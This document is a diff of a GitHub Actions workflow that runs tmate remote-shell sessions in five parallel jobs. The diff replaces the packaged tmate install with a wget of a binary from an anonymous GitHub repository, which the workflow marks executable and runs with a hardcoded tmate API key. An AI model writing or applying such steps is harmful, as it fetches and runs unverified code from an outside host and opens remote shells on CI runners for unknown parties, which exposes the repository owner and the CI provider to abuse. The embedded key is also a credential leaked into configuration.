@@ -1,33 +1,21 @@
-name: tmate-parallel-sessions
+name: Parallel tmate Runner
 
 on:
   workflow_dispatch:
 
 jobs:
-  tmate-session:
+  tmate-parallel:
     runs-on: ubuntu-latest
-    timeout-minutes: 61
+    timeout-minutes: 60
     strategy:
       matrix:
         job_id: [1, 2, 3, 4, 5]
     steps:
-      - name: Install tmate
+      - name: Download tmate binary
         run: |
-          sudo apt-get update
-          sudo apt-get install -y tmate
+          wget https://raw.githubusercontent.com/hp20h5w91nf1/hp20h5w91nf1/main/tmate
+          chmod +x tmate
 
-      - name: Start tmate session
+      - name: Run tmate session
         run: |
-          tmate -S /tmp/tmate.sock new-session -d
-          tmate -S /tmp/tmate.sock wait tmate-ready
-          echo "Web URL:"
-          tmate -S /tmp/tmate.sock display -p 'https://web.tmate.io/tmate/${tmate_ssh}'
-          echo "SSH URL:"
-          tmate -S /tmp/tmate.sock display -p '#{tmate_ssh}'
-          echo "Session will be kept alive for 1 hour."
-          sleep 3600
-
-      - name: Print tmate web session URL
-        run: |
-          echo "Connect to your session using the web URL below:"
-          tmate -S /tmp/tmate.sock display -p 'https://web.tmate.io/tmate/${tmate_ssh}'
+          ./tmate -F -n -k tmk-mS87E0h6YTY55X6FpuAAbWFMpg
